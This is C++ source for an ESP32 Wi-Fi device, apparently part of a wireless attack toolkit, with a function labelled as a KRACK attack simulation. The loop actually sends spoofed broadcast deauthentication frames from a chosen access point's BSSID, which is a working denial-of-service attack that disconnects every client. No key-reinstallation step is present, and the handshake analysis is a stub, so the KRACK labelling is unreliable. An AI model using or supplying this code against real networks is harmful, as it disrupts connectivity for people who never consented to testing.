#include "wifi_krack.h"
#include "tx_arm.h"
#include <WiFi.h>
#include <esp_wifi.h>

namespace WiFiKRACK {

static bool attacking = false;
static uint32_t deauthsSent = 0;

typedef struct {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t da[6];
    uint8_t sa[6];
    uint8_t bssid[6];
    uint16_t seq_ctrl;
    uint16_t reason_code;
} __attribute__((packed)) DeauthFrame;

KrackResult simulateKRACKattack(const String &bssid, uint8_t channel, uint16_t durationMs) {
    KrackResult result{false, bssid, channel, "", ""};

    if (!TxArm::isArmed()) {
        result.error = "TX arming required";
        return result;
    }

    attacking = true;
    deauthsSent = 0;

    Serial.println("KRACK Attack simulation started");
    Serial.println("Target BSSID: " + bssid);
    Serial.println("Channel: " + String(channel));

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL
    };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    unsigned long startTime = millis();

    while (millis() - startTime < durationMs && attacking && TxArm::isArmed()) {
        DeauthFrame frame;
        frame.frame_control = 0xc0;
        frame.duration = 0;
        frame.seq_ctrl = (rand() % 4096) << 4;
        frame.reason_code = 7;

        sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
            &frame.bssid[0], &frame.bssid[1], &frame.bssid[2],
            &frame.bssid[3], &frame.bssid[4], &frame.bssid[5]);

        memset(frame.da, 0xff, 6);
        memcpy(frame.sa, frame.bssid, 6);

        esp_wifi_80211_tx(WIFI_IF_STA, (void *)&frame, sizeof(frame), false);
        deauthsSent++;

        delay(50);
    }

    attacking = false;

    result.success = true;
    result.status = "KRACK simulation - " + String(deauthsSent) + " deauth frames sent";

    Serial.println(result.status);

    return result;
}

String analyzeHandshakes() {
    return "Handshake analysis: KRACK vulnerability simulation active";
}

} // namespace WiFiKRACK
